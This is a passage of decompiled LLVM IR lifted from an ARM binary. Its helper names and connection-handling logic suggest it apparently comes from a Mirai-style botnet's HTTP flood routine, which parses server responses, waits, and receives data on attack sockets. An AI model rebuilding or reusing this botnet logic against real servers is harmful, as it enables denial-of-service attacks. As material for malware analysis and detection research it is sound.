  %v1_9dc0 = trunc i32 %v1_9dbc to i8
  %v2_9dc0 = load i32, i32* @sl, align 4
  %v3_9dc0 = add i32 %v2_9dc0, -1448
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i8*
  store i8 %v1_9dc0, i8* %v4_9dc0, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_9dc8:                                ; preds = %dec_label_pc_9378
  %v0_9dc8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9dc8, i32* @r0, align 4
  %v0_9dcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_9dcc, i32* %r1.global-to-local, align 4
  %v2_9dd0 = inttoptr i32 %v0_9dc8 to i8*
  %v3_9dd0 = call i32 @util_strcpy(i8* %v2_9dd0, i32 %v0_9dcc)
  store i32 %v3_9dd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9390

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9480
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9ddc = load i32, i32* %fp.global-to-local, align 4
  %v2_9ddc = inttoptr i32 %v1_9ddc to i32*
  store i32 104, i32* %v2_9ddc, align 4
  %v0_9de0 = load i32, i32* @sl, align 4
  %v1_9de0 = add i32 %v0_9de0, -1452
  %v2_9de0 = inttoptr i32 %v1_9de0 to i32*
  %v3_9de0 = load i32, i32* %v2_9de0, align 4
  store i32 %v3_9de0, i32* %r0.global-to-local, align 4
  %v1_9de4 = call i32 @__GI___libc_close(i32 %v3_9de0)
  store i32 %v1_9de4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9df0 = load i32, i32* @sl, align 4
  %v2_9df0 = add i32 %v1_9df0, -1452
  %v3_9df0 = inttoptr i32 %v2_9df0 to i32*
  store i32 -1, i32* %v3_9df0, align 4
  %v0_9df4 = load i32, i32* %r2.global-to-local, align 4
  %v1_9df4 = trunc i32 %v0_9df4 to i8
  %v2_9df4 = load i32, i32* @sl, align 4
  %v3_9df4 = add i32 %v2_9df4, -1448
  %v4_9df4 = inttoptr i32 %v3_9df4 to i8*
  store i8 %v1_9df4, i8* %v4_9df4, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_9dfc:                                ; preds = %dec_label_pc_94a8
  %v0_9dfc = load i32, i32* %fp.global-to-local, align 4
  %v1_9dfc = inttoptr i32 %v0_9dfc to i32*
  %v2_9dfc = load i32, i32* %v1_9dfc, align 4
  store i32 %v2_9dfc, i32* %r3.global-to-local, align 4
  %v2_9e00 = icmp ugt i32 %v2_9dfc, 10
  store i1 %v2_9e00, i1* %cpsr_c.global-to-local, align 1
  %v7_9e00 = icmp eq i32 %v2_9dfc, 11
  store i1 %v7_9e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e00, label %dec_label_pc_8ef8, label %dec_label_pc_9e08

dec_label_pc_9e08:                                ; preds = %dec_label_pc_9dfc
  %v0_9e08 = load i32, i32* @sl, align 4
  %v1_9e08 = add i32 %v0_9e08, -1452
  %v2_9e08 = inttoptr i32 %v1_9e08 to i32*
  %v3_9e08 = load i32, i32* %v2_9e08, align 4
  store i32 %v3_9e08, i32* %r0.global-to-local, align 4
  %v1_9e0c = call i32 @__GI___libc_close(i32 %v3_9e08)
  store i32 %v1_9e0c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9e18 = load i32, i32* @sl, align 4
  %v2_9e18 = add i32 %v1_9e18, -1452
  %v3_9e18 = inttoptr i32 %v2_9e18 to i32*
  store i32 -1, i32* %v3_9e18, align 4
  %v0_9e1c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e1c = trunc i32 %v0_9e1c to i8
  %v2_9e1c = load i32, i32* @sl, align 4
  %v3_9e1c = add i32 %v2_9e1c, -1448
  %v4_9e1c = inttoptr i32 %v3_9e1c to i8*
  store i8 %v1_9e1c, i8* %v4_9e1c, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_9e24:                                ; preds = %dec_label_pc_9cb8, %dec_label_pc_9c94
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_9e2c = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_9e30 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e30, i32* @r1, align 4
  store i32 %v3_9e2c, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_9e3c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9e30, i32 %v3_9e2c)
  store i32 %v4_9e3c, i32* %r0.global-to-local, align 4
  %v2_9e44 = icmp eq i32 %v4_9e3c, -1
  store i1 %v2_9e44, i1* %cpsr_c.global-to-local, align 1
  %v7_9e44 = icmp eq i32 %v4_9e3c, -1
  store i1 %v7_9e44, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9e44, label %dec_label_pc_a044, label %dec_label_pc_9e50

dec_label_pc_9e50:                                ; preds = %dec_label_pc_9e24
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_9e58 = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_9e5c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e5c, i32* @r1, align 4
  store i32 %v3_9e58, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_9e68 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9e5c, i32 %v3_9e58)
  store i32 %v4_9e68, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* @lr, align 4
  %v2_9e70 = add i32 %v4_9e68, %v2_8988
  %v3_9e70 = inttoptr i32 %v2_9e70 to i8*
  %v4_9e70 = load i8, i8* %v3_9e70, align 1
  %v2_9e78 = icmp ugt i8 %v4_9e70, 31
  store i1 %v2_9e78, i1* %cpsr_c.global-to-local, align 1
  %v7_9e78 = icmp eq i8 %v4_9e70, 32
  store i1 %v7_9e78, i1* %cpsr_z.global-to-local, align 1
  %v2_9e80 = zext i1 %v7_9e78 to i32
  %v2_9e80.v4_9e68 = add i32 %v2_9e80, %v4_9e68
  store i32 %v2_9e80.v4_9e68, i32* @r4, align 4
  %v2_9e84 = add i32 %v2_9e80.v4_9e68, %v2_8988
  store i32 %v2_9e84, i32* @r5, align 4
  store i32 %v2_9e84, i32* %r0.global-to-local, align 4
  %v1_9e8c = load i32, i32* %fp.global-to-local, align 4
  %v2_9e8c = sub i32 %v1_9e8c, %v2_9e80.v4_9e68
  store i32 %v2_9e8c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9e98 = call i32 @util_memsearch(i32 %v2_9e84, i32 %v2_9e8c, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  store i32 %v5_9e98, i32* %r0.global-to-local, align 4
  %v2_9e9c = icmp eq i32 %v5_9e98, -1
  store i1 %v2_9e9c, i1* %cpsr_c.global-to-local, align 1
  %v7_9e9c = icmp eq i32 %v5_9e98, -1
  store i1 %v7_9e9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_9e98, i32* @r7, align 4
  br i1 %v7_9e9c, label %dec_label_pc_a044, label %dec_label_pc_9ea8

dec_label_pc_9ea8:                                ; preds = %dec_label_pc_9e50
  %v2_9ea8 = icmp ne i32 %v5_9e98, 0
  store i1 %v2_9ea8, i1* %cpsr_c.global-to-local, align 1
  %v7_9ea8 = icmp eq i32 %v5_9e98, 1
  store i1 %v7_9ea8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8da0, i32* %ip.global-to-local, align 4
  %v7_9eb0 = icmp slt i32 %v5_9e98, 2
  br i1 %v7_9eb0, label %bb203, label %bb202

bb202:                                            ; preds = %dec_label_pc_9ea8
  %v9_9eb0 = add i32 %v5_9e98, -2
  store i32 %v9_9eb0, i32* @r7, align 4
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_9ea8, %bb202
  %v1_9eb8 = phi i32 [ %v5_9e98, %dec_label_pc_9ea8 ], [ %v9_9eb0, %bb202 ]
  store i32 %v2_8e1c, i32* %ip.global-to-local, align 4
  %v2_9eb8 = add i32 %v1_9eb8, %v2_8e1c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9ec0 = load i32, i32* @r4, align 4
  %v2_9ec0 = add i32 %v2_9eb8, %v1_9ec0
  store i32 %v2_9ec0, i32* %r2.global-to-local, align 4
  %v3_9ec4 = load i32, i32* @r6, align 4
  %v4_9ec4 = add i32 %v3_9ec4, %v2_9ec0
  %v5_9ec4 = inttoptr i32 %v4_9ec4 to i8*
  store i8 0, i8* %v5_9ec4, align 1
  store i32 %v10_89fc, i32* @lr, align 4
  %v0_9ecc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_9ecc, i32* %stack_var_-44, align 4
  store i32 %v2_8988, i32* %r1.global-to-local, align 4
  %v1_9ed4 = load i32, i32* @r4, align 4
  %v2_9ed4 = add i32 %v1_9ed4, %v2_8988
  %v3_9ed4 = inttoptr i32 %v2_9ed4 to i8*
  %v4_9ed4 = load i8, i8* %v3_9ed4, align 1
  %v6_9ed4 = zext i8 %v4_9ed4 to i32
  store i32 %v6_9ed4, i32* %r0.global-to-local, align 4
  %v1_9ed8 = add nsw i32 %v6_9ed4, -48
  store i32 %v1_9ed8, i32* %r3.global-to-local, align 4
  %v2_9edc = icmp ugt i32 %v1_9ed8, 8
  store i1 %v2_9edc, i1* %cpsr_c.global-to-local, align 1
  %v7_9edc = icmp eq i32 %v1_9ed8, 9
  store i1 %v7_9edc, i1* %cpsr_z.global-to-local, align 1
  %v2_9ee0 = xor i1 %v7_9edc, true
  %v3_9ee0 = and i1 %v2_9edc, %v2_9ee0
  br i1 %v3_9ee0, label %.thread113, label %dec_label_pc_9ee8

.thread113:                                       ; preds = %bb203
  %v4_9ee0 = load i32, i32* @r5, align 4
  store i32 %v4_9ee0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9f10

dec_label_pc_9ee8:                                ; preds = %bb203
  %v1_9ef4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9eec

dec_label_pc_9eec:                                ; preds = %dec_label_pc_9eec, %dec_label_pc_9ee8
  %v0_9f04 = phi i32 [ %v1_9f04, %dec_label_pc_9eec ], [ 1, %dec_label_pc_9ee8 ]
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  store i32 %v0_9f04, i32* %stack_var_-44, align 4
  %v2_9ef4 = add i32 %v0_9f04, %v1_9ef4.pre
  %v3_9ef4 = inttoptr i32 %v2_9ef4 to i8*
  %v4_9ef4 = load i8, i8* %v3_9ef4, align 1
  %v6_9ef4 = zext i8 %v4_9ef4 to i32
  store i32 %v6_9ef4, i32* %r0.global-to-local, align 4
  %v1_9ef8 = add nsw i32 %v6_9ef4, -48
  store i32 %v1_9ef8, i32* %r3.global-to-local, align 4
  store i32 %v0_9f04, i32* %ip.global-to-local, align 4
  %v2_9f00 = icmp ugt i32 %v1_9ef8, 8
  store i1 %v2_9f00, i1* %cpsr_c.global-to-local, align 1
  %v7_9f00 = icmp eq i32 %v1_9ef8, 9
  store i1 %v7_9f00, i1* %cpsr_z.global-to-local, align 1
  %v1_9f04 = add i32 %v0_9f04, 1
  store i32 %v1_9f04, i32* @lr, align 4
  store i32 %v2_9ef4, i32* %r1.global-to-local, align 4
  %v2_9f0c = xor i1 %v2_9f00, true
  %v3_9f0c = or i1 %v7_9f00, %v2_9f0c
  br i1 %v3_9f0c, label %dec_label_pc_9eec, label %dec_label_pc_9f10

dec_label_pc_9f10:                                ; preds = %dec_label_pc_9eec, %.thread113
  %v2_9f1c = phi i32 [ %v4_9ee0, %.thread113 ], [ %v2_9ef4, %dec_label_pc_9eec ]
  %v0_9f10 = phi i32 [ %v6_9ed4, %.thread113 ], [ %v6_9ef4, %dec_label_pc_9eec ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9f10 = icmp eq i32 %v0_9f10, 0
  store i1 %v2_9f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9f10, label %dec_label_pc_a044, label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9f10
  store i32 0, i32* @r6, align 4
  %v3_9f1c = inttoptr i32 %v2_9f1c to i8*
  store i8 0, i8* %v3_9f1c, align 1
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v3_9f24 = load i32, i32* %stack_var_-44, align 4
  %v1_9f28 = add i32 %v3_9f24, 1
  store i32 %v1_9f28, i32* %ip.global-to-local, align 4
  store i32 %v1_9f28, i32* %stack_var_-44, align 4
  %v0_9f30 = load i32, i32* @r5, align 4
  %v2_9f30 = add i32 %v0_9f30, %v1_9f28
  %v3_9f30 = inttoptr i32 %v2_9f30 to i8*
  %v4_9f30 = load i8, i8* %v3_9f30, align 1
  %v6_9f30 = zext i8 %v4_9f30 to i32
  store i32 %v6_9f30, i32* %r3.global-to-local, align 4
  %v2_9f34 = icmp ugt i8 %v4_9f30, 31
  store i1 %v2_9f34, i1* %cpsr_c.global-to-local, align 1
  %v7_9f34 = icmp eq i8 %v4_9f30, 32
  store i1 %v7_9f34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9f34, label %bb205, label %bb204

bb204:                                            ; preds = %dec_label_pc_9f18
  store i32 %v2_9f30, i32* @r4, align 4
  br label %.thread37

bb205:                                            ; preds = %dec_label_pc_9f18
  %v2_9f38 = add i32 %v3_9f24, 2
  store i32 %v2_9f38, i32* %ip.global-to-local, align 4
  %v2_9f3c = add i32 %v0_9f30, %v2_9f38
  store i32 %v2_9f3c, i32* @r4, align 4
  store i32 %v10_89fc, i32* @lr, align 4
  store i32 %v2_9f38, i32* %v11_8a00, align 4
  %v0_9f48.pre = load i32, i32* @r4, align 4
  br label %.thread37

.thread37:                                        ; preds = %bb204, %bb205
  %v0_9f48 = phi i32 [ %v2_9f30, %bb204 ], [ %v0_9f48.pre, %bb205 ]
  store i32 %v0_9f48, i32* %r0.global-to-local, align 4
  %v1_9f4c = inttoptr i32 %v0_9f48 to i8*
  %v2_9f4c = call i32 @util_strlen(i8* %v1_9f4c)
  store i32 ptrtoint ([5 x i8]* @global_var_1b3e4.81 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9f4c, i32* @r1, align 4
  %v0_9f58 = load i32, i32* @r4, align 4
  store i32 %v0_9f58, i32* %r0.global-to-local, align 4
  %v3_9f5c = inttoptr i32 %v0_9f58 to i8*
  %v4_9f5c = call i32 @util_stristr(i8* %v3_9f5c, i32 %v2_9f4c, i32 ptrtoint ([5 x i8]* @global_var_1b3e4.81 to i32))
  store i32 %v4_9f5c, i32* %r0.global-to-local, align 4
  %v2_9f60 = icmp eq i32 %v4_9f5c, -1
  store i1 %v2_9f60, i1* %cpsr_c.global-to-local, align 1
  %v7_9f60 = icmp eq i32 %v4_9f5c, -1
  store i1 %v7_9f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9f60, label %.thread38, label %dec_label_pc_9f70

.thread38:                                        ; preds = %.thread37
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v4_9f68 = load i32, i32* %v11_8a00, align 4
  store i32 %v4_9f68, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9fa4

dec_label_pc_9f70:                                ; preds = %.thread37
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  %v3_9f74 = load i32, i32* %stack_var_-44, align 4
  %v0_9f78 = load i32, i32* @r5, align 4
  %v2_9f78 = add i32 %v0_9f78, %v3_9f74
  store i32 %v2_9f78, i32* @r4, align 4
  store i32 %v2_9f78, i32* %r0.global-to-local, align 4
  %v1_9f80 = inttoptr i32 %v2_9f78 to i8*
  %v2_9f80 = call i32 @util_strlen(i8* %v1_9f80)
  store i32 ptrtoint ([5 x i8]* @global_var_1b3e4.81 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9f80, i32* @r1, align 4
  %v0_9f8c = load i32, i32* @r4, align 4
  store i32 %v0_9f8c, i32* %r0.global-to-local, align 4
  %v4_9f90 = inttoptr i32 %v0_9f8c to i8*
  %v5_9f90 = call i32 @util_stristr(i8* %v4_9f90, i32 %v2_9f80, i32 ptrtoint ([5 x i8]* @global_var_1b3e4.81 to i32))
  store i32 %v5_9f90, i32* %r0.global-to-local, align 4
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  %v3_9f98 = load i32, i32* %stack_var_-44, align 4
  %v2_9f9c = add i32 %v3_9f98, %v5_9f90
  store i32 %v2_9f9c, i32* %ip.global-to-local, align 4
  store i32 %v2_9f9c, i32* %stack_var_-44, align 4
  br label %dec_label_pc_9fa4

dec_label_pc_9fa4:                                ; preds = %.thread38, %dec_label_pc_9f70
  %v0_a480 = phi i32 [ %v4_9f68, %.thread38 ], [ %v2_9f9c, %dec_label_pc_9f70 ]
  %v0_9fa4 = load i32, i32* @r5, align 4
  %v2_9fa4 = add i32 %v0_9fa4, %v0_a480
  %v3_9fa4 = inttoptr i32 %v2_9fa4 to i8*
  %v4_9fa4 = load i8, i8* %v3_9fa4, align 1
  %v6_9fa4 = zext i8 %v4_9fa4 to i32
  store i32 %v6_9fa4, i32* %r3.global-to-local, align 4
  %v2_9fa8 = icmp ugt i8 %v4_9fa4, 33
  store i1 %v2_9fa8, i1* %cpsr_c.global-to-local, align 1
  %v7_9fa8 = icmp eq i8 %v4_9fa4, 34
  store i1 %v7_9fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9fa8, label %dec_label_pc_a480, label %dec_label_pc_9fb0

dec_label_pc_9fb0:                                ; preds = %dec_label_pc_a480, %dec_label_pc_9fa4, %dec_label_pc_a4a8
  %v0_9fb0 = load i32, i32* @r5, align 4
  store i32 %v0_9fb0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_9fb8 = inttoptr i32 %v0_9fb0 to i8*
  %v3_9fb8 = call i32 @util_atoi(i8* %v2_9fb8, i32 10)
  store i32 %v3_9fb8, i32* %r0.global-to-local, align 4
  %v1_9fbc = add i32 %v3_9fb8, -1
  store i32 %v1_9fbc, i32* %r3.global-to-local, align 4
  %v2_9fc0 = icmp ugt i32 %v1_9fbc, 7
  store i1 %v2_9fc0, i1* %cpsr_c.global-to-local, align 1
  %v7_9fc0 = icmp eq i32 %v1_9fbc, 8
  store i1 %v7_9fc0, i1* %cpsr_z.global-to-local, align 1
  %v2_9fc4 = xor i1 %v2_9fc0, true
  %v3_9fc4 = or i1 %v7_9fc0, %v2_9fc4
  br i1 %v3_9fc4, label %dec_label_pc_9fd8.preheader, label %dec_label_pc_9fec

dec_label_pc_9fd8.preheader:                      ; preds = %dec_label_pc_9fb0
  store i32 %v2_8ea8, i32* %r2.global-to-local, align 4
  %v6_9fc8 = add i32 %v3_9fb8, %v2_8ea8
  store i32 %v6_9fc8, i32* @r4, align 4
  br label %dec_label_pc_9fd8

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fd8
  %v1_9fd4 = call i32 @sleep(i32 1)
  store i32 %v1_9fd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9fd8

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fd8.preheader, %dec_label_pc_9fd4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9fdc = call i32 @__GI_time(i32* null)
  %v0_9fe0 = load i32, i32* @r4, align 4
  %v3_9fe0 = icmp uge i32 %v0_9fe0, %v2_9fdc
  store i1 %v3_9fe0, i1* %cpsr_c.global-to-local, align 1
  %v9_9fe0 = icmp eq i32 %v0_9fe0, %v2_9fdc
  store i1 %v9_9fe0, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_9fe8 = xor i1 %v9_9fe0, true
  %v3_9fe8 = and i1 %v3_9fe0, %v2_9fe8
  br i1 %v3_9fe8, label %dec_label_pc_9fd4, label %dec_label_pc_9fec

dec_label_pc_9fec:                                ; preds = %dec_label_pc_9fd8, %dec_label_pc_9fb0
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v3_9ff0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ff0, i32* @r4, align 4
  %v0_9ff4 = load i32, i32* @r5, align 4
  %v2_9ff4 = add i32 %v0_9ff4, %v3_9ff0
  store i32 %v2_9ff4, i32* @r6, align 4
  store i32 %v2_9ff4, i32* %r0.global-to-local, align 4
  %v1_9ffc = inttoptr i32 %v2_9ff4 to i8*
  %v2_9ffc = call i32 @util_strlen(i8* %v1_9ffc)
  store i32 ptrtoint ([5 x i8]* @global_var_1b3dc.79 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9ffc, i32* @r1, align 4
  %v0_a008 = load i32, i32* @r6, align 4
  store i32 %v0_a008, i32* %r0.global-to-local, align 4
  %v4_a00c = inttoptr i32 %v0_a008 to i8*
  %v5_a00c = call i32 @util_stristr(i8* %v4_a00c, i32 %v2_9ffc, i32 ptrtoint ([5 x i8]* @global_var_1b3dc.79 to i32))
  store i32 %v5_a00c, i32* %r0.global-to-local, align 4
  %v2_a010 = icmp ugt i32 %v5_a00c, 3
  store i1 %v2_a010, i1* %cpsr_c.global-to-local, align 1
  %v7_a010 = icmp eq i32 %v5_a00c, 4
  store i1 %v7_a010, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a010, label %dec_label_pc_a36c, label %dec_label_pc_a018

dec_label_pc_a018:                                ; preds = %dec_label_pc_9fec
  %v0_a018 = load i32, i32* @r5, align 4
  %v1_a018 = load i32, i32* @r4, align 4
  %v2_a018 = add i32 %v1_a018, %v0_a018
  %v3_a018 = inttoptr i32 %v2_a018 to i8*
  %v4_a018 = load i8, i8* %v3_a018, align 1
  %v6_a018 = zext i8 %v4_a018 to i32
  store i32 %v6_a018, i32* @r3, align 4
  %v2_a01c = icmp ugt i8 %v4_a018, 46
  store i1 %v2_a01c, i1* %cpsr_c.global-to-local, align 1
  %v7_a01c = icmp eq i8 %v4_a018, 47
  store i1 %v7_a01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a01c, label %dec_label_pc_a4c8, label %dec_label_pc_a024

dec_label_pc_a024:                                ; preds = %dec_label_pc_a018, %dec_label_pc_a4e4, %dec_label_pc_a4c8, %dec_label_pc_a430, %dec_label_pc_a414, %dec_label_pc_a510, %dec_label_pc_a45c
  %v0_a024 = load i32, i32* %sb.global-to-local, align 4
  %v1_a028 = add i32 %v0_a024, 1431
  store i32 %v1_a028, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b3b8.56 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_a034 = call i32 @memcpy()
  store i32 %v0_a034, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_a03c = load i32, i32* @sl, align 4
  %v3_a03c = add i32 %v2_a03c, -1448
  %v4_a03c = inttoptr i32 %v3_a03c to i8*
  store i8 10, i8* %v4_a03c, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_a044:                                ; preds = %dec_label_pc_9f10, %dec_label_pc_9e50, %dec_label_pc_9e24
  %v0_a044 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a044, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b3d0.77 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v5_a054 = call i32 @util_memsearch(i32 %v2_8988, i32 %v0_a044, i32 ptrtoint ([5 x i8]* @global_var_1b3d0.77 to i32), i32 4)
  %v0_a058 = load i32, i32* %sb.global-to-local, align 4
  %v1_a05c = add i32 %v0_a058, 1431
  store i32 %v1_a05c, i32* @r4, align 4
  store i32 %v5_a054, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b3ec.83 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a05c, i32* %r0.global-to-local, align 4
  %v3_a06c = inttoptr i32 %v1_a05c to i8*
  %v4_a06c = call i32 @util_strcmp(i8* %v3_a06c, i32 ptrtoint ([5 x i8]* @global_var_1b3ec.83 to i32))
  store i32 %v4_a06c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a070 = icmp eq i32 %v4_a06c, 0
  store i1 %v2_a070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a070, label %dec_label_pc_a220, label %dec_label_pc_a078

dec_label_pc_a078:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a044
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_a07c = load i32, i32* @sl, align 4
  %v3_a07c = add i32 %v2_a07c, -1448
  %v4_a07c = inttoptr i32 %v3_a07c to i8*
  store i8 7, i8* %v4_a07c, align 1
  br label %dec_label_pc_a080

dec_label_pc_a080:                                ; preds = %bb211, %dec_label_pc_a078
  %v0_a080 = load i32, i32* @r5, align 4
  store i32 %v0_a080, i32* %r2.global-to-local, align 4
  %v0_a084 = load i32, i32* @sl, align 4
  %v1_a084 = add i32 %v0_a084, -1452
  %v2_a084 = inttoptr i32 %v1_a084 to i32*
  %v3_a084 = load i32, i32* %v2_a084, align 4
  store i32 %v3_a084, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a090 = call i32 @__libc_recv(i32 %v3_a084, i32 %v2_8988, i32 %v0_a080, i32 16384)
  store i32 %v4_a090, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8ef8

dec_label_pc_a098:                                ; preds = %dec_label_pc_95a0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v0_a0a0 = load i32, i32* @sl, align 4
  %v1_a0a0 = add i32 %v0_a0a0, 660
  %v2_a0a0 = inttoptr i32 %v1_a0a0 to i32*
  %v3_a0a0 = load i32, i32* %v2_a0a0, align 4
  store i32 %v3_a0a0, i32* @r4, align 4
  %v3_a0a4 = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_a0a8 = load i32, i32* @r4, align 4
  store i32 %v0_a0a8, i32* %r1.global-to-local, align 4
  store i32 %v3_a0a4, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a0b4 = load i32, i32* @r7, align 4
  store i32 %v0_a0b4, i32* %r0.global-to-local, align 4
  %v4_a0b8 = call i32 @util_memsearch(i32 %v0_a0b4, i32 %v0_a0a8, i32 %v3_a0a4, i32 11)
  store i32 %v4_a0b8, i32* %r0.global-to-local, align 4
  %v0_a0bc = load i32, i32* @sl, align 4
  %v1_a0bc = add i32 %v0_a0bc, 660
  %v2_a0bc = inttoptr i32 %v1_a0bc to i32*
  %v3_a0bc = load i32, i32* %v2_a0bc, align 4
  %v0_a0c0 = load i32, i32* @r7, align 4
  %v2_a0c0 = add i32 %v0_a0c0, %v4_a0b8
  store i32 %v2_a0c0, i32* @r6, align 4
  store i32 %v4_a0b8, i32* @r4, align 4
  %v2_a0c8 = sub i32 %v3_a0bc, %v4_a0b8
  store i32 %v2_a0c8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3f4.85 to i32), i32* %r2.global-to-local, align 4
  %v0_a0d0 = load i32, i32* @r8, align 4
  store i32 %v0_a0d0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0c0, i32* %r0.global-to-local, align 4
  %v4_a0d8 = call i32 @util_memsearch(i32 %v2_a0c0, i32 %v2_a0c8, i32 ptrtoint (i32* @global_var_1b3f4.85 to i32), i32 %v0_a0d0)
  store i32 %v4_a0d8, i32* %r0.global-to-local, align 4
  %v0_a0dc = load i32, i32* @sl, align 4
  %v1_a0dc = add i32 %v0_a0dc, 16
  %v2_a0dc = inttoptr i32 %v1_a0dc to i32*
  %v3_a0dc = load i32, i32* %v2_a0dc, align 4
  store i32 %v3_a0dc, i32* %r3.global-to-local, align 4
  %v1_a0e0 = load i32, i32* @r4, align 4
  %v2_a0e0 = add i32 %v1_a0e0, %v4_a0d8
  store i32 %v2_a0e0, i32* @r5, align 4
  %v0_a0e4 = load i32, i32* %sb.global-to-local, align 4
  %v2_a0e4 = add i32 %v0_a0e4, %v2_a0e0
  store i32 %v2_a0e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_a0ec = icmp ugt i32 %v3_a0dc, 3
  store i1 %v2_a0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_a0ec = icmp eq i32 %v3_a0dc, 4
  store i1 %v7_a0ec, i1* %cpsr_z.global-to-local, align 1
  %v3_a0f0 = add i32 %v2_a0e4, 2115
  %v4_a0f0 = inttoptr i32 %v3_a0f0 to i8*
  store i8 0, i8* %v4_a0f0, align 1
  %v7_a0f4 = icmp sgt i32 %v3_a0dc, 4
  br i1 %v7_a0f4, label %dec_label_pc_a0f8, label %dec_label_pc_a260

dec_label_pc_a0f8:                                ; preds = %dec_label_pc_a098, %dec_label_pc_a260, %dec_label_pc_a270
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_a100 = load i32, i32* @sl, align 4
  %v2_a100 = add i32 %v1_a100, 12
  %v3_a100 = inttoptr i32 %v2_a100 to i32*
  store i32 -1, i32* %v3_a100, align 4
  %v0_a104 = load i32, i32* %r2.global-to-local, align 4
